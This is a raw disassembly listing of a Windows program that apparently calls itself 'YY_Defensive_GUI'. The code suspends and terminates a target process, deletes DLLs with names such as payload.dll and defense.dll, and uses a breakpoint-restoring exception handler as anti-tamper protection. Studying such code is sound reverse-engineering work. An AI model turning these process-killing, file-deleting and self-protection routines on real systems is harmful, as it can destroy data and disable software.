call    cs:SuspendThread

loc_140003DC1:          ; hObject
mov     rcx, rbx
call    cs:CloseHandle

loc_140003DCA:          ; lpte
lea     rdx, [rsp+0BE0h+te]
mov     rcx, rdi        ; hSnapshot
call    cs:Thread32Next
test    eax, eax
jnz     short loc_140003D82

loc_140003DDC:          ; hObject
mov     rcx, rdi
call    cs:CloseHandle

loc_140003DE5:          ; dwProcessId
mov     r8d, [rsp+0BE0h+pe.th32ProcessID]
xor     edx, edx        ; bInheritHandle
mov     ecx, 800h       ; dwDesiredAccess
call    cs:OpenProcess
mov     rbx, rax
test    rax, rax
jz      short loc_140003E19
mov     rax, cs:qword_14000C548
test    rax, rax
jz      short loc_140003E19
mov     rcx, rbx
call    rax ; qword_14000C548
mov     rcx, rbx        ; hObject
call    cs:CloseHandle

loc_140003E19:          ; dwProcessId
mov     r8d, [rsp+0BE0h+pe.th32ProcessID]
xor     edx, edx        ; bInheritHandle
mov     ecx, r12d       ; dwDesiredAccess
call    cs:OpenProcess
mov     rbx, rax
test    rax, rax
jz      loc_140003C8B
call    sub_140001D70
xor     edx, edx        ; uExitCode
mov     rcx, rbx        ; hProcess
call    cs:TerminateProcess
mov     rcx, rbx        ; hObject
call    cs:CloseHandle
test    r13b, r13b
jz      loc_1400045B2
lea     rcx, [rbp+0AE0h+ExeName] ; lpString
call    cs:lstrlenW
test    eax, eax
jle     short loc_140003ED1
lea     rcx, [rbp+0AE0h+ExeName] ; lpFileName
call    cs:DeleteFileW
lea     r8, [rbp+0AE0h+ExeName] ; Source
mov     edx, 104h       ; SizeInWords
lea     rcx, [rbp+0AE0h+Destination] ; Destination
call    cs:wcscpy_s
mov     edx, 5Ch ; '\'  ; Ch
lea     rcx, [rbp+0AE0h+Destination] ; Str
call    cs:wcsrchr
test    rax, rax
jz      short loc_140003ED1
xor     ecx, ecx
mov     [rax+2], cx
lea     r8, aXxresBin   ; "xxres.bin"
mov     edx, 104h       ; SizeInWords
lea     rcx, [rbp+0AE0h+Destination] ; Destination
call    cs:wcscat_s
lea     rcx, [rbp+0AE0h+Destination] ; lpFileName
call    cs:DeleteFileW

loc_140003ED1:          ; Val
xor     edx, edx
mov     r8d, 40Eh       ; Size
lea     rcx, [rbp+0AE0h+me.dwSize+2] ; void *
call    memset
mov     rbx, cs:lpString2
xor     eax, eax
mov     word ptr [rbp+0AE0h+me.dwSize], ax
test    rbx, rbx
jz      loc_140003FB3
xor     edx, edx        ; Val
mov     r8d, 208h       ; Size
lea     rcx, [rbp+0AE0h+Destination] ; void *
call    memset
mov     r8d, 104h       ; nSize
lea     rdx, [rbp+0AE0h+Destination] ; lpFilename
xor     ecx, ecx        ; hModule
call    cs:GetModuleFileNameW
test    eax, eax
jz      short loc_140003F9C
mov     edx, 5Ch ; '\'  ; Ch
lea     rcx, [rbp+0AE0h+Destination] ; Str
call    cs:wcsrchr
test    rax, rax
jz      short loc_140003F48
xor     ecx, ecx
mov     [rax+2], cx

loc_140003F48:          ; iMaxLength
mov     r8d, 208h
lea     rdx, [rbp+0AE0h+Destination] ; lpString2
lea     rcx, [rbp+0AE0h+me] ; lpString1
call    cs:lstrcpynW
lea     rcx, [rbp+0AE0h+me] ; lpString
call    cs:lstrlenW
movsxd  r9, eax
lea     rcx, [r9+1]
cmp     rcx, 208h
jnb     short loc_140003F9C
mov     r8d, 208h
sub     r8d, eax        ; iMaxLength
lea     rcx, [rbp+0AE0h+me]
lea     rcx, [rcx+r9*2] ; lpString1
mov     rdx, rbx        ; lpString2
call    cs:lstrcpynW

loc_140003F9C:
cmp     word ptr [rbp+0AE0h+me.dwSize], 0
jz      short loc_140003FB3
lea     rcx, [rbp+0AE0h+me] ; lpFileName
call    cs:DeleteFileW

loc_140003FB3:          ; Val
xor     edx, edx
mov     r8d, 40Eh       ; Size
lea     rcx, [rbp+0AE0h+me.dwSize+2] ; void *
call    memset
mov     rbx, cs:off_140009230 ; "window.dll"
xor     eax, eax
mov     word ptr [rbp+0AE0h+me.dwSize], ax
test    rbx, rbx
jz      loc_140004095
xor     edx, edx        ; Val
mov     r8d, 208h       ; Size
lea     rcx, [rbp+0AE0h+Destination] ; void *
call    memset
mov     r8d, 104h       ; nSize
lea     rdx, [rbp+0AE0h+Destination] ; lpFilename
xor     ecx, ecx        ; hModule
call    cs:GetModuleFileNameW
test    eax, eax
jz      short loc_14000407E
mov     edx, 5Ch ; '\'  ; Ch
lea     rcx, [rbp+0AE0h+Destination] ; Str
call    cs:wcsrchr
test    rax, rax
jz      short loc_14000402A
xor     ecx, ecx
mov     [rax+2], cx

loc_14000402A:          ; iMaxLength
mov     r8d, 208h
lea     rdx, [rbp+0AE0h+Destination] ; lpString2
lea     rcx, [rbp+0AE0h+me] ; lpString1
call    cs:lstrcpynW
lea     rcx, [rbp+0AE0h+me] ; lpString
call    cs:lstrlenW
movsxd  r9, eax
lea     rcx, [r9+1]
cmp     rcx, 208h
jnb     short loc_14000407E
mov     r8d, 208h
sub     r8d, eax        ; iMaxLength
lea     rcx, [rbp+0AE0h+me]
lea     rcx, [rcx+r9*2] ; lpString1
mov     rdx, rbx        ; lpString2
call    cs:lstrcpynW

loc_14000407E:
cmp     word ptr [rbp+0AE0h+me.dwSize], 0
jz      short loc_140004095
lea     rcx, [rbp+0AE0h+me] ; lpFileName
call    cs:DeleteFileW

loc_140004095:          ; Val
xor     edx, edx
mov     r8d, 40Eh       ; Size
lea     rcx, [rbp+0AE0h+me.dwSize+2] ; void *
call    memset
mov     rbx, cs:off_140009238 ; "atkcore.dll"
xor     eax, eax
mov     word ptr [rbp+0AE0h+me.dwSize], ax
test    rbx, rbx
jz      loc_140004177
xor     edx, edx        ; Val
mov     r8d, 208h       ; Size
lea     rcx, [rbp+0AE0h+Destination] ; void *
call    memset
mov     r8d, 104h       ; nSize
lea     rdx, [rbp+0AE0h+Destination] ; lpFilename
xor     ecx, ecx        ; hModule
call    cs:GetModuleFileNameW
test    eax, eax
jz      short loc_140004160
mov     edx, 5Ch ; '\'  ; Ch
lea     rcx, [rbp+0AE0h+Destination] ; Str
call    cs:wcsrchr
test    rax, rax
jz      short loc_14000410C
xor     ecx, ecx
mov     [rax+2], cx

loc_14000410C:          ; iMaxLength
mov     r8d, 208h
lea     rdx, [rbp+0AE0h+Destination] ; lpString2
lea     rcx, [rbp+0AE0h+me] ; lpString1
call    cs:lstrcpynW
lea     rcx, [rbp+0AE0h+me] ; lpString
call    cs:lstrlenW
movsxd  r9, eax
lea     rcx, [r9+1]
cmp     rcx, 208h
jnb     short loc_140004160
mov     r8d, 208h
sub     r8d, eax        ; iMaxLength
lea     rcx, [rbp+0AE0h+me]
lea     rcx, [rcx+r9*2] ; lpString1
mov     rdx, rbx        ; lpString2
call    cs:lstrcpynW

loc_140004160:
cmp     word ptr [rbp+0AE0h+me.dwSize], 0
jz      short loc_140004177
lea     rcx, [rbp+0AE0h+me] ; lpFileName
call    cs:DeleteFileW

loc_140004177:          ; Val
xor     edx, edx
mov     r8d, 40Eh       ; Size
lea     rcx, [rbp+0AE0h+me.dwSize+2] ; void *
call    memset
mov     rbx, cs:off_140009240 ; "payload.dll"
xor     eax, eax
mov     word ptr [rbp+0AE0h+me.dwSize], ax
test    rbx, rbx
jz      loc_140004259
xor     edx, edx        ; Val
mov     r8d, 208h       ; Size
lea     rcx, [rbp+0AE0h+Destination] ; void *
call    memset
mov     r8d, 104h       ; nSize
lea     rdx, [rbp+0AE0h+Destination] ; lpFilename
xor     ecx, ecx        ; hModule
call    cs:GetModuleFileNameW
test    eax, eax
jz      short loc_140004242
mov     edx, 5Ch ; '\'  ; Ch
lea     rcx, [rbp+0AE0h+Destination] ; Str
call    cs:wcsrchr
test    rax, rax
jz      short loc_1400041EE
xor     ecx, ecx
mov     [rax+2], cx

loc_1400041EE:          ; iMaxLength
mov     r8d, 208h
lea     rdx, [rbp+0AE0h+Destination] ; lpString2
lea     rcx, [rbp+0AE0h+me] ; lpString1
call    cs:lstrcpynW
lea     rcx, [rbp+0AE0h+me] ; lpString
call    cs:lstrlenW
movsxd  r9, eax
lea     rcx, [r9+1]
cmp     rcx, 208h
jnb     short loc_140004242
mov     r8d, 208h
sub     r8d, eax        ; iMaxLength
lea     rcx, [rbp+0AE0h+me]
lea     rcx, [rcx+r9*2] ; lpString1
mov     rdx, rbx        ; lpString2
call    cs:lstrcpynW

loc_140004242:
cmp     word ptr [rbp+0AE0h+me.dwSize], 0
jz      short loc_140004259
lea     rcx, [rbp+0AE0h+me] ; lpFileName
call    cs:DeleteFileW

loc_140004259:          ; Val
xor     edx, edx
mov     r8d, 40Eh       ; Size
lea     rcx, [rbp+0AE0h+me.dwSize+2] ; void *
call    memset
mov     rbx, cs:off_140009248 ; "defense.dll"
xor     eax, eax
mov     word ptr [rbp+0AE0h+me.dwSize], ax
test    rbx, rbx
jz      loc_14000433B
xor     edx, edx        ; Val
mov     r8d, 208h       ; Size
lea     rcx, [rbp+0AE0h+Destination] ; void *
call    memset
mov     r8d, 104h       ; nSize
lea     rdx, [rbp+0AE0h+Destination] ; lpFilename
xor     ecx, ecx        ; hModule
call    cs:GetModuleFileNameW
test    eax, eax
jz      short loc_140004324
mov     edx, 5Ch ; '\'  ; Ch
lea     rcx, [rbp+0AE0h+Destination] ; Str
call    cs:wcsrchr
test    rax, rax
jz      short loc_1400042D0
xor     ecx, ecx
mov     [rax+2], cx

loc_1400042D0:          ; iMaxLength
mov     r8d, 208h
lea     rdx, [rbp+0AE0h+Destination] ; lpString2
lea     rcx, [rbp+0AE0h+me] ; lpString1
call    cs:lstrcpynW
lea     rcx, [rbp+0AE0h+me] ; lpString
call    cs:lstrlenW
movsxd  r9, eax
lea     rcx, [r9+1]
cmp     rcx, 208h
jnb     short loc_140004324
mov     r8d, 208h
sub     r8d, eax        ; iMaxLength
lea     rcx, [rbp+0AE0h+me]
lea     rcx, [rcx+r9*2] ; lpString1
mov     rdx, rbx        ; lpString2
call    cs:lstrcpynW

loc_140004324:
cmp     word ptr [rbp+0AE0h+me.dwSize], 0
jz      short loc_14000433B
lea     rcx, [rbp+0AE0h+me] ; lpFileName
call    cs:DeleteFileW

loc_14000433B:          ; Val
xor     edx, edx
mov     r8d, 40Eh       ; Size
lea     rcx, [rbp+0AE0h+me.dwSize+2] ; void *
call    memset
mov     rbx, cs:off_140009250 ; "DeamonWindows.dll"
xor     eax, eax
mov     word ptr [rbp+0AE0h+me.dwSize], ax
test    rbx, rbx
jz      loc_14000441D
xor     edx, edx        ; Val
mov     r8d, 208h       ; Size
lea     rcx, [rbp+0AE0h+Destination] ; void *
call    memset
mov     r8d, 104h       ; nSize
lea     rdx, [rbp+0AE0h+Destination] ; lpFilename
xor     ecx, ecx        ; hModule
call    cs:GetModuleFileNameW
test    eax, eax
jz      short loc_140004406
mov     edx, 5Ch ; '\'  ; Ch
lea     rcx, [rbp+0AE0h+Destination] ; Str
call    cs:wcsrchr
test    rax, rax
jz      short loc_1400043B2
xor     ecx, ecx
mov     [rax+2], cx

loc_1400043B2:          ; iMaxLength
mov     r8d, 208h
lea     rdx, [rbp+0AE0h+Destination] ; lpString2
lea     rcx, [rbp+0AE0h+me] ; lpString1
call    cs:lstrcpynW
lea     rcx, [rbp+0AE0h+me] ; lpString
call    cs:lstrlenW
movsxd  r9, eax
lea     rcx, [r9+1]
cmp     rcx, 208h
jnb     short loc_140004406
mov     r8d, 208h
sub     r8d, eax        ; iMaxLength
lea     rcx, [rbp+0AE0h+me]
lea     rcx, [rcx+r9*2] ; lpString1
mov     rdx, rbx        ; lpString2
call    cs:lstrcpynW

loc_140004406:
cmp     word ptr [rbp+0AE0h+me.dwSize], 0
jz      short loc_14000441D
lea     rcx, [rbp+0AE0h+me] ; lpFileName
call    cs:DeleteFileW

loc_14000441D:          ; Val
xor     edx, edx
mov     r8d, 40Eh       ; Size
lea     rcx, [rbp+0AE0h+me.dwSize+2] ; void *
call    memset
mov     rbx, cs:off_140009258 ; "deamon.dll"
xor     eax, eax
mov     word ptr [rbp+0AE0h+me.dwSize], ax
test    rbx, rbx
jz      loc_1400044FF
xor     edx, edx        ; Val
mov     r8d, 208h       ; Size
lea     rcx, [rbp+0AE0h+Destination] ; void *
call    memset
mov     r8d, 104h       ; nSize
lea     rdx, [rbp+0AE0h+Destination] ; lpFilename
xor     ecx, ecx        ; hModule
call    cs:GetModuleFileNameW
test    eax, eax
jz      short loc_1400044E8
mov     edx, 5Ch ; '\'  ; Ch
lea     rcx, [rbp+0AE0h+Destination] ; Str
call    cs:wcsrchr
test    rax, rax
jz      short loc_140004494
xor     ecx, ecx
mov     [rax+2], cx

loc_140004494:          ; iMaxLength
mov     r8d, 208h
lea     rdx, [rbp+0AE0h+Destination] ; lpString2
lea     rcx, [rbp+0AE0h+me] ; lpString1
call    cs:lstrcpynW
lea     rcx, [rbp+0AE0h+me] ; lpString
call    cs:lstrlenW
movsxd  r9, eax
lea     rcx, [r9+1]
cmp     rcx, 208h
jnb     short loc_1400044E8
mov     r8d, 208h
sub     r8d, eax        ; iMaxLength
lea     rcx, [rbp+0AE0h+me]
lea     rcx, [rcx+r9*2] ; lpString1
mov     rdx, rbx        ; lpString2
call    cs:lstrcpynW

loc_1400044E8:
cmp     word ptr [rbp+0AE0h+me.dwSize], 0
jz      short loc_1400044FF
lea     rcx, [rbp+0AE0h+me] ; lpFileName
call    cs:DeleteFileW

loc_1400044FF:
xorps   xmm0, xmm0
movups  xmmword ptr [rsp+0BE0h+te.dwSize], xmm0
mov     qword ptr [rsp+50h], 0
mov     qword ptr [rsp+0BE0h+te.dwFlags], 0
mov     ecx, 40h ; '@'  ; Size
call    sub_1400062C0
mov     qword ptr [rsp+0BE0h+te.dwSize], rax
mov     qword ptr [rsp+50h], 3Fh ; '?'
mov     qword ptr [rsp+0BE0h+te.dwFlags], 3Fh ; '?'
movaps  xmm0, cs:xmmword_140009070
movups  xmmword ptr [rax], xmm0
movaps  xmm1, cs:xmmword_140009080
movups  xmmword ptr [rax+10h], xmm1
movaps  xmm0, cs:xmmword_140009090
movups  xmmword ptr [rax+20h], xmm0
movups  xmm1, cs:xmmword_140009090+0Fh
movups  xmmword ptr [rax+2Fh], xmm1
mov     byte ptr [rax+3Fh], 0
lea     rcx, [rsp+0BE0h+te]
call    sub_140001780
nop
mov     rdx, qword ptr [rsp+0BE0h+te.dwFlags]
cmp     rdx, 0Fh
jbe     short loc_1400045AD
inc     rdx
mov     rcx, qword ptr [rsp+0BE0h+te.dwSize]
cmp     rdx, 1000h
jb      short loc_1400045A8
mov     rax, [rcx-8]
sub     rcx, rax
sub     rcx, 8
cmp     rcx, 1Fh
ja      short loc_1400045C9
add     rdx, 27h ; '''
mov     rcx, rax        ; Block

loc_1400045A8:
call    j_j_free

loc_1400045AD:
call    sub_140001BB0

loc_1400045B2:
cmp     [rsp+0BE0h+pe.th32ProcessID], esi
jnz     loc_140003C8B
xor     eax, eax
xchg    eax, cs:dword_14000C4E8
jmp     loc_140003C8B

loc_1400045C9:
mov     ecx, 5
int     29h             ; Win8: RtlFailFast(ecx)

loc_1400045D0:
call    __report_rangecheckfailure
db 0CCh
; } // starts at 140003850
sub_140003850 endp

algn_1400045D6:
align 20h



; LONG __stdcall Handler(struct _EXCEPTION_POINTERS *ExceptionInfo)
Handler proc near

var_38= xmmword ptr -38h
var_28= qword ptr -28h
var_20= qword ptr -20h
flOldProtect= dword ptr -18h
var_10= qword ptr -10h
arg_8= qword ptr  10h

; __unwind { // sub_140007150
mov     [rsp+arg_8], rbx
push    rdi
sub     rsp, 50h
mov     rax, cs:__security_cookie
xor     rax, rsp
mov     [rsp+58h+var_10], rax
mov     rbx, [rcx]
cmp     dword ptr [rbx], 80000003h
jnz     loc_140004732
mov     rbx, [rbx+10h]
mov     rdx, cs:Src
cmp     rbx, rdx
jb      loc_140004732
mov     rcx, cs:Size
add     rcx, rdx
cmp     rbx, rcx
jnb     loc_140004732
mov     rcx, rbx
sub     rcx, rdx
mov     rax, cs:qword_14000C4F8
movzx   edi, byte ptr [rax+rcx]
lea     r9, [rsp+58h+flOldProtect] ; lpflOldProtect
mov     edx, 1          ; dwSize
mov     r8d, 40h ; '@'  ; flNewProtect
mov     rcx, rbx        ; lpAddress
call    cs:VirtualProtect
test    eax, eax
jz      loc_140004732
mov     [rbx], dil
lea     r9, [rsp+58h+flOldProtect] ; lpflOldProtect
mov     r8d, [rsp+58h+flOldProtect] ; flNewProtect
mov     edx, 1          ; dwSize
mov     rcx, rbx        ; lpAddress
call    cs:VirtualProtect
xorps   xmm0, xmm0
movups  [rsp+58h+var_38], xmm0
xor     eax, eax
mov     [rsp+58h+var_28], rax
mov     [rsp+58h+var_20], rax
mov     ecx, 40h ; '@'  ; Size
call    sub_1400062C0
mov     qword ptr [rsp+58h+var_38], rax
mov     [rsp+58h+var_28], 3Eh ; '>'
mov     [rsp+58h+var_20], 3Fh ; '?'
movups  xmm0, cs:xmmword_1400090B0
movups  xmmword ptr [rax], xmm0
movups  xmm1, cs:xmmword_1400090C0
movups  xmmword ptr [rax+10h], xmm1
movups  xmm0, cs:xmmword_1400090D0
movups  xmmword ptr [rax+20h], xmm0
movups  xmm1, cs:xmmword_1400090D0+0Eh
movups  xmmword ptr [rax+2Eh], xmm1
mov     byte ptr [rax+3Eh], 0
lea     rcx, [rsp+58h+var_38]
call    sub_140001780
nop
mov     rdx, [rsp+58h+var_20]
cmp     rdx, 0Fh
jbe     short loc_140004724
inc     rdx
mov     rcx, qword ptr [rsp+58h+var_38]
cmp     rdx, 1000h
jb      short loc_14000471F
mov     rax, [rcx-8]
sub     rcx, rax
sub     rcx, 8
cmp     rcx, 1Fh
ja      short loc_14000472B
add     rdx, 27h ; '''
mov     rcx, rax        ; Block

loc_14000471F:
call    j_j_free

loc_140004724:
mov     eax, 0FFFFFFFFh
jmp     short loc_140004734

loc_14000472B:
mov     ecx, 5
int     29h             ; Win8: RtlFailFast(ecx)

loc_140004732:
xor     eax, eax

loc_140004734:
mov     rcx, [rsp+58h+var_10]
xor     rcx, rsp        ; StackCookie
call    __security_check_cookie
mov     rbx, [rsp+58h+arg_8]
add     rsp, 50h
pop     rdi
retn
; } // starts at 1400045E0
Handler endp

algn_14000474C:
align 10h



; __int64 __fastcall sub_140004750(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
sub_140004750 proc near

lParam= qword ptr -18h

sub     rsp, 38h
cmp     edx, 0Ch
jnz     short loc_140004760
xor     eax, eax
add     rsp, 38h
retn

loc_140004760:          ; lParam
mov     [rsp+38h+lParam], r9
mov     r9, r8          ; wParam
mov     r8d, edx        ; Msg
mov     rdx, rcx        ; hWnd
mov     rcx, cs:lpPrevWndFunc ; lpPrevWndFunc
call    cs:CallWindowProcW
add     rsp, 38h
retn
sub_140004750 endp




; __int64 __fastcall sub_140004780(HINSTANCE hInstance)
sub_140004780 proc near

X= dword ptr -48h
Y= dword ptr -40h
nWidth= dword ptr -38h
nHeight= dword ptr -30h
hWndParent= qword ptr -28h
hMenu= qword ptr -20h
hInstance= qword ptr -18h
lpParam= qword ptr -10h
arg_0= qword ptr  8

mov     rax, rsp
mov     [rax+8], rbx
push    rdi
sub     rsp, 60h
xor     edi, edi
lea     r8, WindowName  ; "YY_Defensive_GUI"
mov     [rax-10h], rdi
lea     rdx, ClassName  ; "YYWnd_7f3a9c1e"
mov     [rax-18h], rcx
mov     rbx, rcx
mov     [rax-20h], rdi
mov     r9d, 10CF0000h  ; dwStyle
mov     [rax-28h], rdi
mov     ecx, 8          ; dwExStyle
mov     dword ptr [rax-30h], 190h
mov     dword ptr [rax-38h], 1F4h
mov     dword ptr [rax-40h], 80000000h
mov     dword ptr [rax-48h], 80000000h
call    cs:CreateWindowExW
mov     cs:qword_14000C550, rax
test    rax, rax
jz      loc_14000486D
mov     [rsp+68h+lpParam], rdi ; lpParam
lea     r8, word_140009118 ; lpWindowName
mov     [rsp+68h+hInstance], rbx ; hInstance
lea     rdx, aEdit      ; "EDIT"
mov     [rsp+68h+hMenu], rdi ; hMenu
mov     r9d, 50200844h  ; dwStyle
mov     [rsp+68h+hWndParent], rax ; hWndParent
xor     ecx, ecx        ; dwExStyle
mov     [rsp+68h+nHeight], 154h ; nHeight
mov     [rsp+68h+nWidth], 1CCh ; nWidth
mov     [rsp+68h+Y], 0Ah ; Y
mov     [rsp+68h+X], 0Ah ; X
call    cs:CreateWindowExW
mov     cs:hWnd, rax
test    rax, rax
jz      short loc_14000486D
cmp     cs:lpPrevWndFunc, rdi
jnz     short loc_14000486D
lea     r8, sub_140004750 ; dwNewLong
mov     edx, 0FFFFFFFCh ; nIndex
mov     rcx, rax        ; hWnd
call    cs:SetWindowLongPtrW
mov     cs:lpPrevWndFunc, rax

loc_14000486D:
mov     rbx, [rsp+68h+arg_0]
add     rsp, 60h
pop     rdi
retn
sub_140004780 endp

algn_140004878:
align 20h



sub_140004880 proc near
cmp     edx, 16h
ja      short loc_14000488F
mov     eax, 431004h
bt      eax, edx
jb      short loc_14000489E

loc_14000488F:
cmp     edx, 80h
jz      short loc_14000489E
jmp     cs:DefWindowProcW

loc_14000489E:
xor     eax, eax
retn
sub_140004880 endp

align 10h


; Attributes: bp-based frame fpd=630h

sub_1400048B0 proc near

dwCreationDisposition= dword ptr -710h
dwFlagsAndAttributes= dword ptr -708h
hTemplateFile= qword ptr -700h
var_6F0= xmmword ptr -6F0h
var_6E0= qword ptr -6E0h
var_6D8= qword ptr -6D8h
var_6D0= WNDCLASSEXW ptr -6D0h
NumberOfBytesWritten= dword ptr -680h
Buffer= dword ptr -67Ch
Msg= tagMSG ptr -678h
Filename= word ptr -640h
String= word ptr -430h
var_30= qword ptr -30h

; __unwind { // sub_140007150
push    rbp
push    rbx
push    rsi
push    rdi
push    r14
lea     rbp, [rsp-610h]
sub     rsp, 710h
mov     rax, cs:__security_cookie
xor     rax, rsp
mov     [rbp+630h+var_30], rax
lea     rcx, CriticalSection ; lpCriticalSection
call    cs:InitializeCriticalSection
xor     edx, edx        ; Val
mov     r8d, 208h       ; Size
lea     rcx, [rbp+630h+Filename] ; void *
call    memset
mov     r8d, 104h       ; nSize
lea     rdx, [rbp+630h+Filename] ; lpFilename
xor     ecx, ecx        ; hModule
call    cs:GetModuleFileNameW
xor     r14d, r14d
lea     rcx, [rbp+630h+Filename] ; Str
test    eax, eax
jnz     short loc_140004926
lea     r8, aCYyDebugLog ; "C:\\yy_debug.log"
mov     edx, 104h       ; SizeInWords
call    cs:wcscpy_s
jmp     short loc_140004951

loc_140004926:          ; Ch
mov     edx, 5Ch ; '\'
call    cs:wcsrchr
test    rax, rax
jz      short loc_14000493B
mov     [rax+2], r14w

loc_14000493B:
lea     r8, aYyDebugLog ; "yy_debug.log"
mov     edx, 104h       ; SizeInWords
lea     rcx, [rbp+630h+Filename] ; Destination
call    cs:wcscat_s

loc_140004951:          ; hTemplateFile
mov     [rsp+730h+hTemplateFile], r14
mov     [rsp+730h+dwFlagsAndAttributes], 80h ; dwFlagsAndAttributes
mov     [rsp+730h+dwCreationDisposition], 4 ; dwCreationDisposition
xor     r9d, r9d        ; lpSecurityAttributes
mov     edx, 40000000h  ; dwDesiredAccess
mov     r8d, 3          ; dwShareMode
lea     rcx, [rbp+630h+Filename] ; lpFileName
call    cs:CreateFileW
mov     rbx, rax
cmp     rax, 0FFFFFFFFFFFFFFFFh
jz      short loc_1400049FE
mov     r9d, 2          ; dwMoveMethod
xor     r8d, r8d        ; lpDistanceToMoveHigh
xor     edx, edx        ; lDistanceToMove
mov     rcx, rax        ; hFile
call    cs:SetFilePointer
call    cs:GetCurrentProcessId
mov     r9d, eax
lea     rax, aYyExeMainStart ; "yy.exe main started"
mov     qword ptr [rsp+730h+dwCreationDisposition], rax
lea     r8, Format      ; "[%lu] %s\r\n"
mov     edx, 200h       ; BufferCount
lea     rcx, [rbp+630h+String] ; Buffer
call    sub_140001010
mov     [rbp+630h+NumberOfBytesWritten], r14d
lea     rcx, [rbp+630h+String] ; String
call    wcslen
lea     r8d, [rax+rax]  ; nNumberOfBytesToWrite
mov     qword ptr [rsp+730h+dwCreationDisposition], r14 ; lpOverlapped
lea     r9, [rbp+630h+NumberOfBytesWritten] ; lpNumberOfBytesWritten
lea     rdx, [rbp+630h+String] ; lpBuffer
mov     rcx, rbx        ; hFile
call    cs:WriteFile
mov     rcx, rbx        ; hObject
call    cs:CloseHandle

loc_1400049FE:          ; lpThreadId
mov     qword ptr [rsp+730h+dwFlagsAndAttributes], r14
mov     [rsp+730h+dwCreationDisposition], r14d ; dwCreationFlags
xor     r9d, r9d        ; lpParameter
lea     r8, sub_140002EE0 ; lpStartAddress
xor     edx, edx        ; dwStackSize
xor     ecx, ecx        ; lpThreadAttributes
call    cs:CreateThread
mov     qword ptr [rsp+730h+dwFlagsAndAttributes], r14 ; lpThreadId
mov     [rsp+730h+dwCreationDisposition], r14d ; dwCreationFlags
xor     r9d, r9d        ; lpParameter
lea     r8, sub_140001EE0 ; lpStartAddress
xor     edx, edx        ; dwStackSize
xor     ecx, ecx        ; lpThreadAttributes
call    cs:CreateThread
mov     qword ptr [rsp+730h+dwFlagsAndAttributes], r14 ; lpThreadId
mov     [rsp+730h+dwCreationDisposition], r14d ; dwCreationFlags
xor     r9d, r9d        ; lpParameter
lea     r8, sub_140003850 ; lpStartAddress
xor     edx, edx        ; dwStackSize
xor     ecx, ecx        ; lpThreadAttributes
call    cs:CreateThread
mov     qword ptr [rsp+730h+dwFlagsAndAttributes], r14 ; lpThreadId
mov     [rsp+730h+dwCreationDisposition], r14d ; dwCreationFlags
xor     r9d, r9d        ; lpParameter
lea     r8, sub_140002800 ; lpStartAddress
xor     edx, edx        ; dwStackSize
xor     ecx, ecx        ; lpThreadAttributes
call    cs:CreateThread
mov     qword ptr [rsp+730h+dwFlagsAndAttributes], r14 ; lpThreadId
mov     [rsp+730h+dwCreationDisposition], r14d ; dwCreationFlags
xor     r9d, r9d        ; lpParameter
lea     r8, sub_140002820 ; lpStartAddress
xor     edx, edx        ; dwStackSize
xor     ecx, ecx        ; lpThreadAttributes
call    cs:CreateThread
xor     ecx, ecx        ; lpModuleName
call    cs:GetModuleHandleW
mov     r11, rax
test    rax, rax
jz      loc_140004B58
mov     cs:Src, rax
mov     edi, 50000h
mov     cs:Size, rdi
mov     eax, 5A4Dh
cmp     [r11], ax
jnz     short loc_140004B33
movsxd  rdx, dword ptr [r11+3Ch]
add     rdx, r11
cmp     dword ptr [rdx], 4550h
jnz     short loc_140004B33
movzx   r10d, word ptr [rdx+14h]
add     r10, rdx
movzx   ebx, word ptr [rdx+6]
mov     r8d, r14d
cmp     r14w, bx
jnb     short loc_140004B33
lea     rsi, aText      ; ".text"

loc_140004AF1:
movzx   eax, r8w
lea     r9, [rax+rax*4]
lea     rdx, [r10+r9*8]
mov     rax, r14

loc_140004B00:
movzx   ecx, byte ptr [rdx+rax+18h]
inc     rax
cmp     cl, [rsi+rax-1]
jnz     loc_140004CF4
cmp     rax, 6
jnz     short loc_140004B00
mov     eax, [r10+r9*8+24h]
add     rax, r11
mov     cs:Src, rax
mov     edi, [r10+r9*8+20h]
mov     cs:Size, rdi

loc_140004B33:          ; Size
mov     rcx, rdi
call    sub_140006330
mov     cs:qword_14000C4F8, rax
mov     r8, cs:Size     ; Size
mov     rdx, cs:Src     ; Src
mov     rcx, rax        ; void *
call    memcpy

loc_140004B58:          ; Handler
lea     rdx, Handler
mov     ecx, 1          ; First
call    cs:AddVectoredExceptionHandler
call    sub_140001BB0
mov     [rsp+730h+hTemplateFile], r14 ; hTemplateFile
mov     [rsp+730h+dwFlagsAndAttributes], 80h ; dwFlagsAndAttributes
mov     [rsp+730h+dwCreationDisposition], 3 ; dwCreationDisposition
xor     r9d, r9d        ; lpSecurityAttributes
xor     r8d, r8d        ; dwShareMode
mov     edx, 0C0000000h ; dwDesiredAccess
mov     rcx, cs:lpFileName ; lpFileName
call    cs:CreateFileW
mov     cs:qword_14000C0C8, rax
mov     [rsp+730h+hTemplateFile], r14 ; hTemplateFile
mov     [rsp+730h+dwFlagsAndAttributes], 80h ; dwFlagsAndAttributes
mov     [rsp+730h+dwCreationDisposition], 3 ; dwCreationDisposition
xor     r9d, r9d        ; lpSecurityAttributes
xor     r8d, r8d        ; dwShareMode
mov     edx, 0C0000000h ; dwDesiredAccess
mov     rcx, cs:off_140009208 ; lpFileName
call    cs:CreateFileW
mov     cs:qword_14000C0D0, rax
mov     [rsp+730h+hTemplateFile], r14 ; hTemplateFile
mov     [rsp+730h+dwFlagsAndAttributes], 80h ; dwFlagsAndAttributes
mov     [rsp+730h+dwCreationDisposition], 3 ; dwCreationDisposition
xor     r9d, r9d        ; lpSecurityAttributes
xor     r8d, r8d        ; dwShareMode
mov     edx, 0C0000000h ; dwDesiredAccess
mov     rcx, cs:off_140009210 ; lpFileName
call    cs:CreateFileW
mov     cs:qword_14000C0D8, rax
mov     [rsp+730h+hTemplateFile], r14 ; hTemplateFile
mov     [rsp+730h+dwFlagsAndAttributes], 80h ; dwFlagsAndAttributes
mov     [rsp+730h+dwCreationDisposition], 3 ; dwCreationDisposition
xor     r9d, r9d        ; lpSecurityAttributes
xor     r8d, r8d        ; dwShareMode
mov     edx, 0C0000000h ; dwDesiredAccess
mov     rcx, cs:off_140009218 ; lpFileName
call    cs:CreateFileW
mov     cs:qword_14000C0E0, rax
mov     qword ptr [rsp+730h+dwFlagsAndAttributes], r14 ; lpThreadId
mov     [rsp+730h+dwCreationDisposition], r14d ; dwCreationFlags
xor     r9d, r9d        ; lpParameter
lea     r8, sub_140001F80 ; lpStartAddress
xor     edx, edx        ; dwStackSize
xor     ecx, ecx        ; lpThreadAttributes
call    cs:CreateThread
call    sub_140002A90
